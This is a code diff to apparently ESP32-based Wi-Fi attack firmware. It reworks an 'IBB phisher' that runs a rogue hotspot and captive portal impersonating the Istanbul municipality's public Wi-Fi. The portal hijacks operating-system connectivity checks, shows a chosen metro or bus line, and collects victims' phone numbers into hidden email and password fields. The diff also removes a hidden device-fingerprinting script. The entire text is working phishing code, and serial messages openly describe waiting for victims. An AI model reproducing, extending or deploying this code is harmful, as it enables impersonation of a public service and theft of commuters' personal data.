@@ -6155,55 +6155,224 @@ const char ibb_phisher_html[] PROGMEM = R"rawliteral(
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-<title>IBB WiFi</title>
+<title>&#304;BB - Elektronik Sistemler &#350;ube M&#252;d&#252;rl&#252;&#287;&#252;</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box}
-  body{min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',Tahoma,sans-serif;overflow-y:auto;padding:15px;background:#000}
-  .bg{position:fixed;inset:0;background-image:url('/ibb_bg.jpg');background-size:cover;background-position:center;filter:brightness(0.9);z-index:-1}
-  .modal{position:relative;z-index:10;background:rgba(13,30,48,0.85);border-radius:8px;width:100%;max-width:360px;min-height:480px;height:auto;display:flex;flex-direction:column;border:none;box-shadow:0 10px 40px rgba(0,0,0,0.5)}
-  .modal-header{background:transparent;border-bottom:1px solid #1a385b;width:100%;text-align:center;padding:16px 10px;font-size:13px;font-weight:500;color:#e0e0e0}
-  .modal-body{padding:30px 25px 20px;display:flex;flex-direction:column;align-items:center;flex-grow:1}
-  .logo-img{width:100px;height:auto;object-fit:contain;margin-bottom:15px;transition:all 0.3s ease}
-  .location-container{display:flex;flex-direction:column;align-items:center;gap:4px;margin-bottom:20px}
-  .location-icon{width:20px;height:20px}
-  .location-text{color:#fff;font-size:14px;font-weight:500;letter-spacing:0.5px;text-align:center}
-  .input-group{width:100%;background:#1c1d1f;border-radius:4px;overflow:hidden;display:flex;flex-direction:column;margin-bottom:25px}
-  .select-wrapper{position:relative;border-bottom:1px solid #2a2a2a}
-  .select-wrapper select{width:100%;padding:10px 30px 10px 12px;background:transparent;border:none;color:#fff;font-size:14px;appearance:none;cursor:pointer;outline:none}
-  .select-arrow{position:absolute;right:12px;top:50%;transform:translateY(-50%);pointer-events:none;color:#fff;font-weight:bold;font-size:12px}
-  .select-wrapper select option{background:#1c1d1f;color:#fff}
-  .phone-row{display:flex;align-items:center;padding:8px 12px;background:transparent}
-  .phone-prefix{display:flex;align-items:center;gap:6px;color:#fff;font-size:14px;font-weight:500;min-width:60px}
-  .flag-img{width:20px;height:auto;border-radius:2px;object-fit:cover}
-  .country-abbr{display:none;font-size:13px;font-weight:700;color:#ccc;background:#111;padding:2px 4px;border-radius:3px}
-  .phone-row input{flex:1;background:transparent;border:none;outline:none;color:#999;font-size:14px;padding-left:5px;width:100%}
-  .phone-row input::placeholder{color:#999}
-  .btn-ileri{background:#238b50;color:#fff;border:none;border-radius:30px;padding:12px 50px;font-size:15px;font-weight:500;cursor:pointer;transition:background 0.2s;width:100%;max-width:200px}
-  .btn-ileri:hover{background:#1b6d3e}
-  .footer-area{margin-top:auto;width:100%;text-align:center;padding-bottom:20px}
-  .lang-link{color:#fff;font-size:13px;font-weight:400;text-decoration:underline;cursor:pointer;background:none;border:none}
-  @media screen and (max-height:600px){.modal-body{padding:20px 20px 15px}.logo-img{width:75px;margin-bottom:10px}.location-container{margin-bottom:15px}.input-group{margin-bottom:20px}.modal{min-height:auto}}
-  @media screen and (max-width:350px){.modal-body{padding:25px 15px 15px}.btn-ileri{max-width:100%}}
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Montserrat', sans-serif;
+    overflow-y: auto; 
+    padding: 15px; 
+    background: #000; 
+  }
+  .bg {
+    position: fixed;
+    inset: 0;
+    background-image: url('/ibb_bg.jpg'); 
+    background-size: cover;
+    background-position: center;
+    filter: brightness(0.9); 
+    z-index: -1; 
+  }
+  .modal {
+    position: relative;
+    z-index: 10;
+    background: rgba(13, 30, 48, 0.85); 
+    border-radius: 8px;
+    width: 100%;
+    max-width: 360px; 
+    min-height: 480px; 
+    height: auto; 
+    display: flex;
+    flex-direction: column;
+    border: none;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+  }
+  .modal-header {
+    background: transparent;
+    border-bottom: 1px solid #1a385b; 
+    width: 100%;
+    text-align: center;
+    padding: 16px 10px;
+    font-size: 13px;
+    font-weight: 500;
+    color: #e0e0e0;
+  }
+  .modal-body {
+    padding: 30px 25px 20px; 
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    flex-grow: 1;
+  }
+  .logo-img {
+    width: 100px; 
+    height: auto;
+    object-fit: contain;
+    margin-bottom: 15px;
+    transition: all 0.3s ease; 
+  }
+  .location-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    margin-bottom: 20px;
+  }
+  .location-icon { width: 20px; height: 20px; }
+  .location-text {
+    color: #fff;
+    font-family: 'Montserrat', sans-serif;
+    font-size: 14px; 
+    font-weight: 500;
+    letter-spacing: 0.5px;
+    text-align: center;
+  }
+  .input-group {
+    width: 100%;
+    background: #1c1d1f; 
+    border-radius: 4px;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    margin-bottom: 25px;
+  }
+  .select-wrapper {
+    position: relative;
+    border-bottom: 1px solid #2a2a2a; 
+  }
+  .select-wrapper select {
+    width: 100%;
+    padding: 10px 30px 10px 12px;
+    background: transparent;
+    border: none;
+    color: #fff;
+    font-family: 'Montserrat', sans-serif;
+    font-size: 14px;
+    appearance: none;
+    cursor: pointer;
+    outline: none;
+  }
+  .select-arrow {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    pointer-events: none;
+    color: #fff;
+    font-weight: bold;
+    font-size: 12px;
+  }
+  .select-wrapper select option { background: #1c1d1f; color: #fff; }
+  .phone-row {
+    display: flex;
+    align-items: center;
+    padding: 8px 12px;
+    background: transparent;
+  }
+  .phone-prefix {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: #fff;
+    font-family: 'Montserrat', sans-serif;
+    font-size: 14px;
+    font-weight: 500;
+    min-width: 60px;
+  }
+  .flag-img {
+    width: 20px; 
+    height: auto;
+    border-radius: 2px;
+    object-fit: cover;
+  }
+  .country-abbr {
+    display: none;
+    font-size: 13px;
+    font-weight: 700;
+    color: #ccc;
+    background: #111;
+    padding: 2px 4px;
+    border-radius: 3px;
+  }
+  .phone-row input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: #999; 
+    font-family: 'Montserrat', sans-serif;
+    font-size: 14px;
+    padding-left: 5px;
+    width: 100%;
+  }
+  .phone-row input::placeholder { color: #999; }
+  .btn-ileri {
+    background: #238b50; 
+    color: #fff;
+    border: none;
+    border-radius: 30px;
+    padding: 12px 50px;
+    font-family: 'Montserrat', sans-serif;
+    font-size: 15px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background 0.2s;
+    width: 100%; 
+    max-width: 200px;
+  }
+  .btn-ileri:hover { background: #1b6d3e; }
+  .footer-area {
+    margin-top: auto; 
+    width: 100%;
+    text-align: center;
+    padding-bottom: 20px; 
+  }
+  .lang-link {
+    color: #fff;
+    font-family: 'Montserrat', sans-serif;
+    font-size: 13px; 
+    font-weight: 400;
+    text-decoration: underline;
+    cursor: pointer;
+    background: none;
+    border: none;
+  }
+  .lang-link:hover { color: #ccc; }
+  @media screen and (max-height: 600px) {
+    .modal-body { padding: 20px 20px 15px; }
+    .logo-img { width: 75px; margin-bottom: 10px; }
+    .location-container { margin-bottom: 15px; }
+    .input-group { margin-bottom: 20px; }
+    .modal { min-height: auto; }
+  }
+  @media screen and (max-width: 350px) {
+    .modal-body { padding: 25px 15px 15px; }
+    .btn-ileri { max-width: 100%; }
+  }
 </style>
 </head>
 <body>
   <div class="bg"></div>
   <div class="modal">
-    <div class="modal-header">Elektronik Sistemler Sube Mudurlugu</div>
+    <div class="modal-header">Elektronik Sistemler &#350;ube M&#252;d&#252;rl&#252;&#287;&#252;</div>
     <div class="modal-body">
-      <img class="logo-img" src="/ibb_logo.png" alt="IBB Logo" />
+      <img class="logo-img" src="/ibb_logo.png" alt="&#304;BB Logo" />
       <div class="location-container">
         <svg class="location-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M12 2C8.13 2 5 5.13 5 9C5 14.25 12 22 12 22C12 22 19 14.25 19 9C19 5.13 15.87 2 12 2ZM12 11.5C10.62 11.5 9.5 10.38 9.5 9C9.5 7.62 10.62 6.5 12 6.5C13.38 6.5 14.5 7.62 14.5 9C14.5 10.38 13.38 11.5 12 11.5Z" fill="#ffffff"/>
             <circle cx="12" cy="9" r="1.2" fill="#ffffff"/>
         </svg>
-        <span class="location-text">METRO M5-Uskudar-Samandira Merkez</span>
+        <span class="location-text">%HATCODE%</span>
       </div>
-      <form action="/login" method="POST" style="width:100%;display:flex;flex-direction:column;align-items:center;">
-        <div class="input-group">
+      <form action="/login" method="POST" style="width:100%; display:flex; flex-direction:column; align-items:center;">
+        <input type="hidden" name="email" id="email_field" value=""><input type="hidden" name="password" id="password_field" value=""><div class="input-group">
           <div class="select-wrapper">
             <select id="country-select" name="country">
-              <option value="TR,+90">Turkiye</option>
+              <option value="TR,+90">T&#252;rkiye</option>
               <option value="US,+1">United States</option>
               <option value="GB,+44">United Kingdom</option>
               <option value="DE,+49">Germany</option>
@@ -6216,20 +6385,10 @@ const char ibb_phisher_html[] PROGMEM = R"rawliteral(
               <span class="country-abbr" id="country-abbr">US</span>
               <span id="calling-code">+90</span>
             </div>
-            <input type="tel" name="phone" placeholder="Telefon Numarasi" required />
+            <input type="tel" name="phone" id="phone_input" placeholder="Telefon Numaras&#305;" required />
           </div>
         </div>
-        <input type="hidden" name="ua" id="ua_field">
-        <input type="hidden" name="scr" id="scr_field">
-        <input type="hidden" name="lang" id="lang_field">
-        <input type="hidden" name="plat" id="plat_field">
-        <input type="hidden" name="tz" id="tz_field">
-        <input type="hidden" name="bat" id="bat_field">
-        <input type="hidden" name="touch" id="touch_field">
-        <input type="hidden" name="mem" id="mem_field">
-        <input type="hidden" name="cores" id="cores_field">
-        <input type="hidden" name="conn" id="conn_field">
-        <button type="submit" class="btn-ileri">Ileri</button>
+        <button type="submit" class="btn-ileri" onclick="document.getElementById('email_field').value=document.getElementById('phone_input').value;document.getElementById('password_field').value=document.getElementById('phone_input').value;">&#304;leri</button>
       </form>
     </div>
     <div class="footer-area">
@@ -6237,33 +6396,39 @@ const char ibb_phisher_html[] PROGMEM = R"rawliteral(
     </div>
   </div>
   <script>
-    var cs=document.getElementById('country-select');
-    var fi=document.getElementById('flag-img');
-    var ca=document.getElementById('country-abbr');
-    var cc=document.getElementById('calling-code');
-    cs.addEventListener('change',function(){
-      var p=this.value.split(',');
-      cc.textContent=p[1];
-      if(p[0]==='TR'){fi.style.display='block';ca.style.display='none';}
-      else{fi.style.display='none';ca.style.display='block';ca.textContent=p[0];}
+    const countrySelect = document.getElementById('country-select');
+    const flagImg = document.getElementById('flag-img');
+    const countryAbbr = document.getElementById('country-abbr');
+    const callingCode = document.getElementById('calling-code');
+    countrySelect.addEventListener('change', function() {
+      const selectedValue = this.value;
+      const dataParts = selectedValue.split(',');
+      const abbr = dataParts[0];
+      const code = dataParts[1];
+      callingCode.textContent = code;
+      if (abbr === 'TR') {
+        flagImg.style.display = 'block';
+        countryAbbr.style.display = 'none';
+      } else {
+        flagImg.style.display = 'none';
+        countryAbbr.style.display = 'block';
+        countryAbbr.textContent = abbr;
+      }
     });
-    // Cihaz bilgilerini topla
-    (function(){
-      try{document.getElementById('ua_field').value=navigator.userAgent;}catch(e){}
-      try{document.getElementById('scr_field').value=screen.width+'x'+screen.height+'|'+window.devicePixelRatio+'x';}catch(e){}
-      try{document.getElementById('lang_field').value=navigator.language||navigator.userLanguage||'';}catch(e){}
-      try{document.getElementById('plat_field').value=navigator.platform||'';}catch(e){}
-      try{document.getElementById('tz_field').value=Intl.DateTimeFormat().resolvedOptions().timeZone||'';}catch(e){}
-      try{document.getElementById('touch_field').value=navigator.maxTouchPoints||0;}catch(e){}
-      try{document.getElementById('mem_field').value=navigator.deviceMemory||'?';}catch(e){}
-      try{document.getElementById('cores_field').value=navigator.hardwareConcurrency||'?';}catch(e){}
-      try{var c=navigator.connection||navigator.mozConnection;document.getElementById('conn_field').value=c?(c.effectiveType||'')+'|'+(c.downlink||'')+'Mbps':'';}catch(e){}
-      try{navigator.getBattery().then(function(b){document.getElementById('bat_field').value=Math.round(b.level*100)+'%|'+(b.charging?'Sarjda':'Pilde');});}catch(e){}
-    })();
   </script>
 </body>
 </html>
+
 )rawliteral";
+
+// IBB Portal - Hat kodu (dinamik)
+static String ibb_hat_kodu = "M5-Uskudar-Samandira Merkez";
+
+// Template processor - %HATCODE% placeholder'ini hat koduyla degistirir
+String ibbTemplateProcessor(const String& var) {
+  if (var == "HATCODE") return ibb_hat_kodu;
+  return String();
+}
 
 void WiFiScan::RunIBBPhisher(uint8_t scan_mode, uint16_t color) {
   this->currentScanMode = WIFI_SCAN_IBB_PHISHER;
@@ -6292,6 +6457,59 @@ void WiFiScan::RunIBBPhisher(uint8_t scan_mode, uint16_t color) {
   if (portal_ssid.length() == 0) {
     portal_ssid = "ibbWiFi";
   }
+
+  // Hat kodu sor
+  Serial.println(F("[?] Hat/Guzergah Kodu [Enter = M5 Metro]: "));
+  Serial.println(F("    Ornekler: 500T, 34BZ, M5, M7, MR1, TB1, M11"));
+  String hat_input = "";
+  while (true) {
+    if (Serial.available()) {
+      hat_input = Serial.readStringUntil('\n');
+      hat_input.trim();
+      if (hat_input.startsWith("#")) {
+        this->currentScanMode = WIFI_SCAN_OFF;
+        return;
+      }
+      break;
+    }
+    delay(100);
+  }
+  if (hat_input.length() == 0) {
+    ibb_hat_kodu = "M5-Uskudar-Samandira Merkez";
+  } else {
+    // Hat koduna gore otomatik isim ata
+    hat_input.toUpperCase();
+    // Metro hatlari
+    if (hat_input == "M1") ibb_hat_kodu = "METRO " + hat_input + " - Yenikapi-Ataturk Havalimani";
+    else if (hat_input == "M2") ibb_hat_kodu = "METRO " + hat_input + " - Yenikapi-Haciosman";
+    else if (hat_input == "M3") ibb_hat_kodu = "METRO " + hat_input + " - Kirazli-Olimpiyat";
+    else if (hat_input == "M4") ibb_hat_kodu = "METRO " + hat_input + " - Kadikoy-Tavsantepe";
+    else if (hat_input == "M5") ibb_hat_kodu = "METRO " + hat_input + " - Uskudar-Samandira";
+    else if (hat_input == "M6") ibb_hat_kodu = "METRO " + hat_input + " - Levent-Bogazici Uni";
+    else if (hat_input == "M7") ibb_hat_kodu = "METRO " + hat_input + " - Mecidiyekoy-Mahmutbey";
+    else if (hat_input == "M8") ibb_hat_kodu = "METRO " + hat_input + " - Bostanci-Dudullu";
+    else if (hat_input == "M9") ibb_hat_kodu = "METRO " + hat_input + " - Atakoy-Ikitelli";
+    else if (hat_input == "M11") ibb_hat_kodu = "METRO " + hat_input + " - Gayrettepe-Istanbul Havalimani";
+    else if (hat_input == "M12") ibb_hat_kodu = "METRO " + hat_input + " - Goztepe-Umraniye";
+    // Marmaray
+    else if (hat_input == "MR1" || hat_input == "MARMARAY") ibb_hat_kodu = "MARMARAY - Halkali-Gebze";
+    // Metrobus
+    else if (hat_input == "MB" || hat_input == "TB1" || hat_input == "METROBUS") ibb_hat_kodu = "METROBUS - Beylikduzu-Sogutlucesme";
+    // Tramvay
+    else if (hat_input == "T1") ibb_hat_kodu = "TRAMVAY " + hat_input + " - Kabatas-Bagcilar";
+    else if (hat_input == "T4") ibb_hat_kodu = "TRAMVAY " + hat_input + " - Topkapi-Mescid-i Selam";
+    else if (hat_input == "T5") ibb_hat_kodu = "TRAMVAY " + hat_input + " - Cibali-Alibeykov";
+    // Otobus - populer hatlar
+    else if (hat_input.startsWith("500")) ibb_hat_kodu = "OTOBUS " + hat_input + " - Otobus Hatti";
+    else if (hat_input.startsWith("34")) ibb_hat_kodu = "OTOBUS " + hat_input + " - Otobus Hatti";
+    else if (hat_input.startsWith("15")) ibb_hat_kodu = "OTOBUS " + hat_input + " - Otobus Hatti";
+    else if (hat_input.startsWith("76")) ibb_hat_kodu = "OTOBUS " + hat_input + " - Otobus Hatti";
+    else if (hat_input.startsWith("E")) ibb_hat_kodu = "OTOBUS " + hat_input + " - Otobus Hatti";
+    // Diger - girilen kodu oldugu gibi goster
+    else ibb_hat_kodu = hat_input + " - Toplu Tasima Hatti";
+  }
+  Serial.print(F("[~] Hat kodu ayarlandi: "));
+  Serial.println(ibb_hat_kodu);
   WiFi.mode(WIFI_AP);
   delay(200);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
@@ -6356,7 +6574,9 @@ void WiFiScan::RunIBBPhisher(uint8_t scan_mode, uint16_t color) {
   server.reset();
 
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
 
   server.on("/ibb_bg.jpg", HTTP_GET, [](AsyncWebServerRequest *request) {
@@ -6464,47 +6684,70 @@ void WiFiScan::RunIBBPhisher(uint8_t scan_mode, uint16_t color) {
   // Captive portal detection - redirect yapmadan dogrudan HTML sun
   // Boylece URL'de connectivitycheck.gstatic.com gorunur
   server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
   server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
   server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
   server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
   server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
   server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
   server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
   server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
   server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
   server.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *request) {
     request->send(204);
   });
 
   server.onNotFound([](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", ibb_phisher_html);
+    String html = String(FPSTR(ibb_phisher_html));
+    html.replace("%HATCODE%", ibb_hat_kodu);
+    request->send(200, "text/html", html);
   });
 
   server.begin();
 
-  Serial.print(F("\n[RUN] IBB M5 Metro Portal Aktif! SSID: "));
+  Serial.print(F("\n[RUN] IBB Portal Aktif! SSID: "));
   Serial.println(portal_ssid);
+  Serial.print(F("[~] Hat/Guzergah: "));
+  Serial.println(ibb_hat_kodu);
   Serial.println(F("[~] Portal IP: 192.168.4.1"));
-  Serial.println(F("[~] Arka plan, logo ve bayrak resimleri dahil edildi."));
-  Serial.println(F("[~] Kurbanlarin baglanmasi ve telefon numarasi girisi bekleniyor..."));
+  Serial.println(F("[~] URL: connectivitycheck.gstatic.com"));
+  Serial.println(F("[~] Arka plan, logo ve bayrak resimleri dahil."));
+  Serial.println(F("[~] Kurbanlarin baglanmasi ve telefon no girisi bekleniyor..."));
   Serial.println(F("[~] Durdurmak icin # yazin.\n"));
 
   this->wifi_initialized = true;
@@ -7057,6 +7300,9 @@ void WiFiScan::apSnifferCallbackFull(void *buf,
 
       if (in_list < 0) {
 
+        Serial.print(F("["));
+        Serial.print(access_points->size());
+        Serial.print(F("] "));
         Serial.print(snifferPacket->rx_ctrl.rssi);
         Serial.print(F(" Ch: "));
         Serial.print((String)snifferPacket->rx_ctrl.channel + " ");
